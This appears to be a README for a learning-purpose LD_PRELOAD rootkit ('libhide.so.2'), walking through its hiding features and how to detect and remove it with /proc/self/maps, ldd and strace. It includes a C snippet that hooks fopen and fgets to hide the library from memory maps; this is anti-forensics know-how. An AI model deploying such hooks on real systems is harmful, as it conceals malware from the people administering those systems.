# libhide.so.2
A userland ld_preloader rootkit for the purpose of learning  a little bit about computer forensics.<br><br>
libhide.so.2 hides from all the typical tools that we rely on to tell us whats going on with out computer, including<br>

[+] Hides from ps<br>
[+] Hides from netstat and ss commands<br>
[+] Hides from lsof<br>
[+] Hides itself (libhide.so.2)<br>
[+] Hides a specified port<br>
[+] Hides a specified directory<br>
[+] Hides the entry in /etc/ld.so.preload

So then, with all the hiding information this rootkit does, how do we find it?<br>
There are a couple simple forensics tools that we can use in order to determine what is going on here.<br>

THe first tool we can use reads virtual memory and determines what shared libraries are loaded into memory. Below is an example after having loaded libhide.so.2 into memory via the ld preloader.<br><br>
```
marc@archlinux:$ cat /proc/self/maps
55ac55b8a000-55ac55b8c000 r--p 00000000 00:19 18090                      /usr/bin/cat
55ac55b8c000-55ac55b92000 r-xp 00002000 00:19 18090                      /usr/bin/cat
55ac55b92000-55ac55b95000 r--p 00008000 00:19 18090                      /usr/bin/cat
55ac55b95000-55ac55b96000 r--p 0000a000 00:19 18090                      /usr/bin/cat
55ac55b96000-55ac55b97000 rw-p 0000b000 00:19 18090                      /usr/bin/cat
55ac9380a000-55ac9382b000 rw-p 00000000 00:00 0                          [heap]
7f4596e00000-7f45970ed000 r--p 00000000 00:19 108278                     /usr/lib/locale/locale-archive
7f4597209000-7f459724e000 rw-p 00000000 00:00 0 
7f459724e000-7f4597272000 r--p 00000000 00:19 3804                       /usr/lib/libc.so.6
7f4597272000-7f45973e3000 r-xp 00024000 00:19 3804                       /usr/lib/libc.so.6
7f45973e3000-7f4597431000 r--p 00195000 00:19 3804                       /usr/lib/libc.so.6
7f4597431000-7f4597435000 r--p 001e2000 00:19 3804                       /usr/lib/libc.so.6
7f4597435000-7f4597437000 rw-p 001e6000 00:19 3804                       /usr/lib/libc.so.6
7f4597437000-7f459743f000 rw-p 00000000 00:00 0 
7f4597447000-7f4597448000 r--p 00000000 00:19 170712                     /usr/local/lib/libhide.so.2
7f4597448000-7f4597449000 r-xp 00001000 00:19 170712                     /usr/local/lib/libhide.so.2
7f4597449000-7f459744a000 r--p 00002000 00:19 170712                     /usr/local/lib/libhide.so.2
7f459744a000-7f459744b000 r--p 00002000 00:19 170712                     /usr/local/lib/libhide.so.2
7f459744b000-7f459744c000 rw-p 00003000 00:19 170712                     /usr/local/lib/libhide.so.2
7f459744c000-7f459744e000 rw-p 00000000 00:00 0 
7f459744f000-7f4597453000 r--p 00000000 00:00 0                          [vvar]
7f4597453000-7f4597455000 r--p 00000000 00:00 0                          [vvar_vclock]
7f4597455000-7f4597457000 r-xp 00000000 00:00 0                          [vdso]
7f4597457000-7f4597458000 r--p 00000000 00:19 3795                       /usr/lib/ld-linux-x86-64.so.2
7f4597458000-7f4597482000 r-xp 00001000 00:19 3795                       /usr/lib/ld-linux-x86-64.so.2
7f4597482000-7f459748d000 r--p 0002b000 00:19 3795                       /usr/lib/ld-linux-x86-64.so.2
7f459748d000-7f459748f000 r--p 00036000 00:19 3795                       /usr/lib/ld-linux-x86-64.so.2
7f459748f000-7f4597490000 rw-p 00038000 00:19 3795                       /usr/lib/ld-linux-x86-64.so.2
7f4597490000-7f4597491000 rw-p 00000000 00:00 0 
7ffd8784a000-7ffd8786b000 rw-p 00000000 00:00 0                          [stack]
ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]
```
As you can see above, clearly libhide.so.2 is being used here. In addition, if we run ls -l /usr/local/lib/, we see that there is nothing listed in that directory
At least thats what we're being told! Another note, there is a way to hide this entry from cat /proc/self/maps. So, this may not show up if attacker purposely hides it from virtual memory.
Below is the code needed to hide from cat /proc/self/maps
```#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <dirent.h>
#include <dlfcn.h>
#include <stdarg.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <limits.h>

FILE *fopen(const char *pathname, const char *mode) {
    static FILE* (*orig_fopen)(const char*, const char*) = NULL;
    if (!orig_fopen) orig_fopen = dlsym(RTLD_NEXT, "fopen");

    FILE *fp = orig_fopen(pathname, mode);
    
    // Check if process is reading its own memory maps
    if (pathname && strstr(pathname, "/proc/") && strstr(pathname, "/maps")) {
        proc_maps_fp = fp; 
    }
    return fp;
}

char *fgets(char *s, int size, FILE *stream) {
    static char* (*orig_fgets)(char*, int, FILE*) = NULL;
    if (!orig_fgets) orig_fgets = dlsym(RTLD_NEXT, "fgets");

    char *result;
    while ((result = orig_fgets(s, size, stream)) != NULL) {
        // If current stream is the maps file, filter out our library name
        if (stream == proc_maps_fp && strstr(s, "libhide.so.2")) {
            continue; 
        }
        break;
    }
    return result;
}

int fclose(FILE *stream) {
    static int (*orig_fclose)(FILE*) = NULL;
    if (!orig_fclose) orig_fclose = dlsym(RTLD_NEXT, "fclose");

    if (stream == proc_maps_fp) {
        proc_maps_fp = NULL;
    }
    return orig_fclose(stream);
}
```


You can also find this shared library by runing ldd /usr/bin/lsof.<br>
```
marc@archlinux:$ ldd /usr/bin/lsof
	linux-vdso.so.1 (0x00007f59a0d6a000)
	--> /usr/local/lib/libhide.so.2 (0x00007f59a0d2d000)
	libtirpc.so.3 => /usr/lib/libtirpc.so.3 (0x00007f59a0cf7000)
	libc.so.6 => /usr/lib/libc.so.6 (0x00007f59a0b06000)
	libgssapi_krb5.so.2 => /usr/lib/libgssapi_krb5.so.2 (0x00007f59a0ab3000)
	/lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007f59a0d6c000)
	libkrb5.so.3 => /usr/lib/libkrb5.so.3 (0x00007f59a09ed000)
	libk5crypto.so.3 => /usr/lib/libk5crypto.so.3 (0x00007f59a09c0000)
	libcom_err.so.2 => /usr/lib/libcom_err.so.2 (0x00007f59a09b8000)
	libkrb5support.so.0 => /usr/lib/libkrb5support.so.0 (0x00007f59a09aa000)
	libkeyutils.so.1 => /usr/lib/libkeyutils.so.1 (0x00007f59a09a3000)
	libresolv.so.2 => /usr/lib/libresolv.so.2 (0x00007f59a0991000)
  ```
And finally, strange that cat /etc/ld.so.preload is not showing any entries. It appears to not be loading any libraries. However, if we trace the call using strace, we can see, towards the bottom, that another file is being opened when we try to read /etc/ld.so.preload. In this case, a blank /etc/ld.so.preload.dummy is being opened, so it appears to us that there are no shared libraries being loaded.
Heres what the line looks like when we run strace cat /etc/ld.so.preload
```
openat(AT_FDCWD, "/etc/ld.so.preload.dummy", O_RDONLY) = 6
```

So then, now that we are armed with this information, we can easily disable this rootkit. Simple change the name of the hidden libary. mv /usr/local/lib/libhide.so.2 /usr/local/lib/libhide.so.2.tmp. Once that is done,
you should be able to open the real /etc/ld.so.preload and simply remove the line that loads the shared library (/usr/local/lib/libhide.so.2). Now, our system tools start telling us what is really going on.
secret_dir is now revealed and also the shared library itself.





